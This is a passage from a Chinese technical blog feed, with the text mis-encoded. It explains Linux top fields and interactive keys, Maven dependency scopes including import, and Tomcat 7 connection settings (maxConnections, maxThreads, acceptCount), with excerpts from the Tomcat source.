<p>PIDï¼šè¿›ç¨‹çš„ID<br>USERï¼šè¿›ç¨‹æ‰€æœ‰è€…<br>PRï¼šè¿›ç¨‹çš„ä¼˜å…ˆçº§åˆ«ï¼Œè¶Šå°è¶Šä¼˜å…ˆè¢«æ‰§è¡Œ<br>NIï¼šniceå€¼<br>VIRTï¼šè¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜<br>RESï¼šè¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜<br>SHRï¼šè¿›ç¨‹ä½¿ç”¨çš„å…±äº«å†…å­˜<br>Sï¼šè¿›ç¨‹çš„çŠ¶æ€ã€‚Sè¡¨ç¤ºä¼‘çœ ï¼ŒRè¡¨ç¤ºæ­£åœ¨è¿è¡Œï¼ŒZè¡¨ç¤ºåƒµæ­»çŠ¶æ€ï¼ŒNè¡¨ç¤ºè¯¥è¿›ç¨‹ä¼˜å…ˆå€¼ä¸ºè´Ÿæ•°<br>%CPUï¼šè¿›ç¨‹å ç”¨CPUçš„ä½¿ç”¨ç‡<br>%MEMï¼šè¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†å†…å­˜å’Œæ€»å†…å­˜çš„ç™¾åˆ†æ¯”<br>TIME+ï¼šè¯¥è¿›ç¨‹å¯åŠ¨åå ç”¨çš„æ€»çš„CPUæ—¶é—´ï¼Œå³å ç”¨CPUä½¿ç”¨æ—¶é—´çš„ç´¯åŠ å€¼ã€‚<br>COMMANDï¼šè¿›ç¨‹å¯åŠ¨å‘½ä»¤åç§°</p>
</blockquote>
<h2 id="é«˜çº§ç”¨æ³•"><a href="#é«˜çº§ç”¨æ³•" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h2><h3 id="äº¤äº’å‘½ä»¤"><a href="#äº¤äº’å‘½ä»¤" class="headerlink" title="äº¤äº’å‘½ä»¤"></a>äº¤äº’å‘½ä»¤</h3><ul>
<li><p>æŒ‰ç…§CPUå ç”¨æ’åºï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥ï¼š <code>P</code></p>
</li>
<li><p>æŒ‰ç…§å†…å­˜æ’åºï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥ï¼š <code>M</code></p>
</li>
<li><p>æ€æ­»è¿›ç¨‹ï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥: <code>k</code>, ç„¶åæ ¹æ®æç¤ºè¾“å…¥ç›¸åº”çš„<code>pid</code></p>
</li>
<li><p>æ›´æ”¹åˆ·æ–°æ—¶é—´ï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥: <code>d</code>æˆ–è€…<code>s</code>, ç„¶åè¾“å…¥ç›¸åº”çš„åˆ·æ–°å€¼</p>
</li>
<li><p>æ˜¾ç¤ºCPUçš„æ¯ä¸ªæ ¸çš„ä½¿ç”¨æƒ…å†µï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥ï¼š é”®ç›˜ä¸Šçš„<code>1</code></p>
</li>
</ul>
<p>topçš„æ˜¾ç¤ºç•Œé¢ä¼šå±•å¼€ï¼š</p>
<img src="/2017/09/09/top/cpu.png">
<ul>
<li>é«˜äº®æ¨¡å¼ï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥: â€˜zâ€™</li>
</ul>
<img src="/2017/09/09/top/highlight.png">
<ul>
<li>é«˜äº®å½“å‰çš„æ’åºåˆ—(éœ€è¦åœ¨zæ¨¡å¼ä¸‹)ï¼š äº¤äº’æ¨¡å¼ä¸‹è¾“å…¥: â€˜xâ€™</li>
</ul>
<img src="/2017/09/09/top/highlight-sort.png">
<ul>
<li><p>æ”¹å˜æ’åºåˆ—ï¼š äº¤äº’æ¨¡å¼ä¸‹æŒ‰<code>shift</code> + <code>&lt;</code>æˆ–<code>&gt;</code></p>
</li>
<li><p>å¢åŠ æ˜¾ç¤ºçš„Fieldï¼š äº¤äº’æ¨¡å¼ä¸‹æŒ‰<code>f</code>, ç„¶åé€‰æ‹©æƒ³è¦å±•ç¤ºçš„åˆ—</p>
</li>
</ul>
<img src="/2017/09/09/top/fields.png">
<ul>
<li><p>æ˜¾ç¤ºåˆ°çº¿ç¨‹çº§åˆ«ï¼š äº¤äº’æ¨¡å¼ä¸‹æŒ‰<code>H</code></p>
</li>
<li><p>æ˜¾ç¤ºå®Œæ•´çš„å‘½ä»¤åç§°: äº¤äº’æ¨¡å¼ä¸‹æŒ‰<code>c</code></p>
</li>
<li><p>åˆ†ç±»æ˜¾ç¤ºå„ç§ç³»ç»Ÿèµ„æºé«˜çš„è¿›ç¨‹ï¼š äº¤äº’æ¨¡å¼ä¸‹æŒ‰<code>A</code></p>
</li>
</ul>
<img src="/2017/09/09/top/top-a.png">
<h3 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h3><ul>
<li>æ˜¾ç¤ºæŸä¸ªè¿›ç¨‹çš„çº¿ç¨‹ä¿¡æ¯</li>
</ul>
<p><code>top -p &lt;PID&gt; -H</code></p>
<p>å…¶ä¸­ <code>-H</code>æ˜¯æŒ‡æ˜¾ç¤ºçº¿ç¨‹çš„ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªçº¿ç¨‹çš„CPUå ç”¨æƒ…å†µ</p>

<ul>
<li>æ˜¾ç¤ºå®Œæ•´çš„å‘½ä»¤ï¼š <code>-c</code></li>
</ul>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><p><a href="http://kumu-linux.github.io/blog/2013/06/07/top-hacks/" rel="external nofollow noopener noreferrer" target="_blank">topå®è·µå°æŠ€å·§ - OPS Notes By æ¯æœ¨</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzAxMzQ3NzQ3Nw==&amp;mid=2654249787&amp;idx=2&amp;sn=7aa8e765fda84d5fa26580c210585c53&amp;chksm=8061f031b716792776833370019a9fc4c79fa40ea7db5b4ccb165b90919056acaffd3d971d94&amp;mpshare=1&amp;scene=1&amp;srcid=0801QspCI2Xo04BsZlP6pCVb##" rel="external nofollow noopener noreferrer" target="_blank">LinuxæœåŠ¡å™¨çš„é‚£äº›æ€§èƒ½å‚æ•°æŒ‡æ ‡</a></p>
</li>
<li><p><a href="http://linuxperf.com/?p=33" rel="external nofollow noopener noreferrer" target="_blank">ç†è§£ %iowait (%wio) | Linux Performance</a></p>
</li>
<li><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/top.html" rel="external nofollow noopener noreferrer" target="_blank">8. top linuxä¸‹çš„ä»»åŠ¡ç®¡ç†å™¨ â€” Linux Tools Quick Tutorial</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> top </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jvm-flag]]></title>
      <url>http://qsli.github.io/2017/06/03/jvm-flag/</url>
      <content type="html"><![CDATA[<p>jinfo</p>
<p>-Xss</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[maven-scope]]></title>
      <url>http://qsli.github.io/2017/06/01/maven-scope/</url>
      <content type="html"><![CDATA[<h2 id="scope-ä½œç”¨"><a href="#scope-ä½œç”¨" class="headerlink" title="scope ä½œç”¨"></a>scope ä½œç”¨</h2><blockquote>
<p>Dependency scope is used to limit the transitivity of a dependency, and also to affect the classpath used for various build tasks.</p>
</blockquote>
<p>ä¸»è¦æ˜¯é™åˆ¶ä¾èµ–çš„ä¼ é€’æ€§ï¼Œæ¯”å¦‚æœ‰äº›jaråŒ…åªä¼šåœ¨æµ‹è¯•çš„æ—¶å€™æ‰ä¼šæœ‰æ•ˆï¼Œéƒ¨ç½²çš„æ—¶å€™ä¸ä¼šç”Ÿæ•ˆã€‚</p>
<p>scopeçš„åˆ†ç±»ï¼š</p>
<table>
<thead>
<tr>
<th>scope</th>
<th>ç”Ÿæ•ˆæ—¶æœº</th>
<th>ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>compiled</td>
<td>ç¼–è¯‘/æµ‹è¯•/è¿è¡Œ</td>
<td>é»˜è®¤</td>
</tr>
<tr>
<td>provided</td>
<td>ç¼–è¯‘/æµ‹è¯•</td>
<td>servlet-api ç”±tomcatç­‰å®¹å™¨æä¾›</td>
</tr>
<tr>
<td>runtime</td>
<td>è¿è¡Œ</td>
<td>ç¼–è¯‘çš„æ—¶å€™åªéœ€è¦ï¼ŒJDBC APIï¼Œ è¿è¡Œçš„æ—¶å€™å¿…é¡»è¦æœ‰JDBCé©±åŠ¨å®ç°</td>
</tr>
<tr>
<td>test</td>
<td>æµ‹è¯•çš„æ—¶å€™æ‰å¼•å…¥</td>
<td>junit åªåœ¨æµ‹è¯•çš„æ—¶å€™ç”Ÿæ•ˆ</td>
</tr>
<tr>
<td>system</td>
<td>ç¼–è¯‘/æµ‹è¯•</td>
<td>å¿…é¡»æ˜¾å¼çš„æä¾›jarçš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„</td>
</tr>
<tr>
<td>import</td>
<td>åªæ”¯æŒ<code>dependencyManagement</code>å…ƒç´ ä¸‹çš„typeæ˜¯pomçš„èŠ‚ç‚¹</td>
<td>only available in Maven 2.0.9 or later</td>
</tr>
</tbody>
</table>
<h3 id="import-scope"><a href="#import-scope" class="headerlink" title="import scope"></a>import scope</h3><p>ä½¿ç”¨æ–¹</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.air<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;com.air.haha.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>com.air.hahaçš„å£°æ˜</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.air<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>a<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>b<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨æ–¹åœ¨ä½¿ç”¨çš„æ—¶å€™å°±å¯ä»¥ä¸ç”¨æŒ‡å®šï¼Œhahaä¸­åŒ…å«çš„ä¾èµ–çš„ç‰ˆæœ¬ï¼Œé»˜è®¤å°±ä¼šä½¿ç”¨hahaä¸­å£°æ˜çš„ç‰ˆæœ¬ã€‚è¿™æ ·åœ¨å‡çº§çš„æ—¶å€™ï¼Œå¯ä»¥ä¿è¯ä¾èµ–ä¸€åŒçš„å‡çº§ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html" rel="external nofollow noopener noreferrer" target="_blank">Maven â€“ Introduction to the Dependency Mechanism</a></p>
</li>
<li><p>ã€ŠMavenæƒå¨æŒ‡å—ã€‹â€”â€” 9.4 ï¼ˆé¡¹ç›®ä¾èµ–ï¼‰</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> maven </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcatè¿æ¥æ•°ç›¸å…³çš„é…ç½®]]></title>
      <url>http://qsli.github.io/2017/04/05/tomcat-connection/</url>
      <content type="html"><![CDATA[<p><em>ä»¥ä¸‹æ˜¯tomcat7çš„ä¸€äº›é…ç½®è¯´æ˜</em></p>
<h1 id="tomcatäº¤äº’å›¾"><a href="#tomcatäº¤äº’å›¾" class="headerlink" title="tomcatäº¤äº’å›¾"></a>tomcatäº¤äº’å›¾</h1><img src="/2017/04/05/tomcat-connection/tomcat-interaction.jpg" title="å›¾ç‰‡å–è‡ªå‚è€ƒ1">
<h2 id="maxConnections"><a href="#maxConnections" class="headerlink" title="maxConnections"></a>maxConnections</h2><p>tomcatæ¥å—çš„æœ€å¤§è¿æ¥çš„ä¸ªæ•°ï¼Œè¶…è¿‡è¿™ä¸ªè¿æ¥ä¸ªæ•°ï¼Œacceptorå°±ä¼šé˜»å¡ã€‚</p>
<blockquote>
<p>The maximum number of connections that the server will accept and process at any given time. When this number has been reached, the server will accept, but not process, one further connection. This additional connection be blocked until the number of connections being processed falls below maxConnections at which point the server will start accepting and processing new connections again. Note that once the limit has been reached, the operating system may still accept connections based on the acceptCount setting. The default value varies by connector type. For BIO the default is the value of maxThreads unless an Executor is used in which case the default will be the value of maxThreads from the executor. For NIO the default is 10000. For APR/native, the default is 8192.</p>
</blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨BIOæ¨¡å¼ä¸‹ï¼Œ<code>maxConnections</code>çš„å€¼é»˜è®¤ç­‰äº<code>maxThreads</code>çš„å€¼!!!</p>
<p>è¾¾åˆ°maxConnectionsä¹‹åï¼Œacceptorçº¿ç¨‹å°±ä¼šé˜»å¡ï¼Œç”¨jstackæŸ¥çœ‹å †æ ˆä¼šå‘ç°Acceptorçº¿ç¨‹é˜»å¡åœ¨ä¸‹é¢çš„ä»£ç </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat jstack  `pgrep -f <span class="string">'tomcat'</span>` | less</span><br></pre></td></tr></table></figure>
<p>tomcat  7çš„æºç ä¸­ç›¸åº”çš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if we have reached max connections, wait</span></span><br><span class="line">countUpOrAwaitConnection();</span><br></pre></td></tr></table></figure>
<p>å‡½æ•°çš„å…·ä½“å®ç°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">countUpOrAwaitConnection</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (maxConnections==-<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    LimitLatch latch = connectionLimitLatch;</span><br><span class="line">    <span class="keyword">if</span> (latch!=<span class="keyword">null</span>) latch.countUpOrAwait();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>LimitLatch</code>æ˜¯tomcatè‡ªå·±å®ç°çš„ä¸€ä¸ªç±»ä¼¼<code>CountDownLatch</code>çš„ä¸œè¥¿ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Shared latch that allows the latch to be acquired a limited number of times</span></span><br><span class="line"><span class="comment"> * after which all subsequent requests to acquire the latch will be placed in a</span></span><br><span class="line"><span class="comment"> * FIFO queue until one of the shares is returned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LimitLatch</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>å®ƒçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> LimitLatch <span class="title">initializeConnectionLatch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (maxConnections==-<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (connectionLimitLatch==<span class="keyword">null</span>) &#123;</span><br><span class="line">        connectionLimitLatch = <span class="keyword">new</span> LimitLatch(getMaxConnections());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> connectionLimitLatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="maxThreads"><a href="#maxThreads" class="headerlink" title="maxThreads"></a>maxThreads</h2><p>tomcatçš„è¿æ¥çº¿ç¨‹æœ€å¤§ä¸ªæ•°ã€‚</p>
<blockquote>
<p>The maximum number of request processing threads to be created by this Connector, which therefore determines the maximum number of simultaneous requests that can be handled. If not specified, this attribute is set to 200. If an executor is associated with this connector, this attribute is ignored as the connector will execute tasks using the executor rather than an internal thread pool. Note that if an executor is configured any value set for this attribute will be recorded correctly but it will be reported (e.g. via JMX) as -1 to make clear that it is not used.</p>
</blockquote>
<blockquote>
<p>maxThreadsã€minSpareThreadsæ˜¯tomcatå·¥ä½œçº¿ç¨‹æ± çš„é…ç½®å‚æ•°ï¼ŒmaxThreadså°±ç›¸å½“äºjdkçº¿ç¨‹æ± çš„maxPoolSizeï¼Œè€ŒminSpareThreadså°±ç›¸å½“äºjdkçº¿ç¨‹æ± çš„corePoolSizeã€‚</p>
</blockquote>
<p>ç›¸åº”çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internalExecutor = <span class="keyword">true</span>;</span><br><span class="line">    TaskQueue taskqueue = <span class="keyword">new</span> TaskQueue();</span><br><span class="line">    TaskThreadFactory tf = <span class="keyword">new</span> TaskThreadFactory(getName() + <span class="string">"-exec-"</span>, daemon, getThreadPriority());</span><br><span class="line">    executor = <span class="keyword">new</span> ThreadPoolExecutor(getMinSpareThreads(), getMaxThreads(), <span class="number">60</span>, TimeUnit.SECONDS,taskqueue, tf);</span><br><span class="line">    taskqueue.setParent( (ThreadPoolExecutor) executor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="acceptCount"><a href="#acceptCount" class="headerlink" title="acceptCount"></a>acceptCount</h2><p>ç³»ç»Ÿç§¯å‹é˜Ÿåˆ—çš„å¤§å°ã€‚</p>
<blockquote>
<p>The maximum queue length for incoming connection requests when all possible request processing threads are in use. Any requests received when the queue is full will be refused. The default value is 100.</p>
</blockquote>
<p>tomcat7çš„æºç ä¸­æœ‰è¿™ä¹ˆä¸€æ®µï¼Œå¤§æ¦‚å°±æ˜¯åˆ«åçš„æ›¿æ¢ã€‚<code>acceptCount</code>è¢«æ›¿æ¢æˆäº†<code>backlog</code>ï¼Œ<code>backlog</code>çš„æ„æ€æ˜¯ç§¯å‹çš„ä¸œè¥¿ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    replacements.put(<span class="string">"acceptCount"</span>, <span class="string">"backlog"</span>);</span><br><span class="line">    replacements.put(<span class="string">"connectionLinger"</span>, <span class="string">"soLinger"</span>);</span><br><span class="line">    replacements.put(<span class="string">"connectionTimeout"</span>, <span class="string">"soTimeout"</span>);</span><br><span class="line">    replacements.put(<span class="string">"rootFile"</span>, <span class="string">"rootfile"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>acceptCount</code>æ˜¯åœ¨åˆå§‹<code>bind</code>çš„æ—¶å€™ä¼ ç»™jdkçš„<code>bind</code>å‡½æ•°çš„ï¼Œæœ€ç»ˆä¼šä¼ é€’åˆ°ç³»ç»Ÿå±‚ã€‚<br>ä»¥<code>NioEndpoint</code>ä¸ºä¾‹ï¼Œå¤§æ¦‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Initialize the endpoint.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">       serverSock = ServerSocketChannel.open();</span><br><span class="line">       socketProperties.setProperties(serverSock.socket());</span><br><span class="line">       InetSocketAddress addr = (getAddress()!=<span class="keyword">null</span>?<span class="keyword">new</span> InetSocketAddress(getAddress(),getPort()):<span class="keyword">new</span> InetSocketAddress(getPort()));</span><br><span class="line">       serverSock.socket().bind(addr,getBacklog());</span><br><span class="line">       serverSock.configureBlocking(<span class="keyword">true</span>); <span class="comment">//mimic APR behavior</span></span><br><span class="line">       serverSock.socket().setSoTimeout(getSocketProperties().getSoTimeout());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Initialize thread count defaults for acceptor, poller</span></span><br><span class="line">       <span class="keyword">if</span> (acceptorThreadCount == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// <span class="doctag">FIXME:</span> Doesn't seem to work that well with multiple accept threads</span></span><br><span class="line">           acceptorThreadCount = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (pollerThreadCount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">//minimum one poller thread</span></span><br><span class="line">           pollerThreadCount = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       stopLatch = <span class="keyword">new</span> CountDownLatch(pollerThreadCount);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Initialize SSL if needed</span></span><br><span class="line">       <span class="keyword">if</span> (isSSLEnabled()) &#123;</span><br><span class="line">          <span class="comment">//ssl stuff</span></span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (oomParachute&gt;<span class="number">0</span>) reclaimParachute(<span class="keyword">true</span>);</span><br><span class="line">       selectorPool.open();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸‹<code>getBackLog</code>çš„å®ç°(<code>AbstractEndpoint</code>)ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allows the server developer to specify the backlog that</span></span><br><span class="line"><span class="comment"> * should be used for server sockets. By default, this value</span></span><br><span class="line"><span class="comment"> * is 100.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> backlog = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBacklog</span><span class="params">(<span class="keyword">int</span> backlog)</span> </span>&#123; <span class="keyword">if</span> (backlog &gt; <span class="number">0</span>) <span class="keyword">this</span>.backlog = backlog; &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBacklog</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> backlog; &#125;</span><br></pre></td></tr></table></figure>
<p>é»˜è®¤å€¼å¤§å°æ˜¯<code>100</code>ã€‚</p>
